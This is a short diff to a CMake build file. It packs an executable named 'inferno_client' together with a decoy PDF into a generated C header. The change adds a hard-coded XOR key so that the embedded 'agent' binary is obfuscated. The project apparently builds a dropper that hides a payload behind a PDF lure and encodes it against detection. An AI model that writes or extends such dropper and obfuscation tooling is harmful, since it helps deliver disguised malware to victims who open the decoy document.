@@ -11,16 +11,19 @@ endif()
 set(DECOY_PDF "${CMAKE_CURRENT_SOURCE_DIR}/resources/decoy.pdf")
 set(AGENT_BINARY_HEADER "${CMAKE_CURRENT_BINARY_DIR}/agent_binary.h")
 
+set(INFERNO_XOR_KEY "2B7E151628AED2A6")
+
 add_custom_command(
     OUTPUT  ${AGENT_BINARY_HEADER}
     COMMAND ${Python3_EXECUTABLE}
             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
+            "--key" "${INFERNO_XOR_KEY}"
             "${CMAKE_BINARY_DIR}/inferno_client${CMAKE_EXECUTABLE_SUFFIX}"
             "${DECOY_PDF}"
             "${AGENT_BINARY_HEADER}"
     DEPENDS  inferno_client
              "${DECOY_PDF}"
-    COMMENT "Generating agent_binary.h from inferno_client + decoy PDF"
+    COMMENT "Generating agent_binary.h (XOR-encrypted) from inferno_client + decoy PDF"
 )
 
 set(WRAPPER_SOURCES
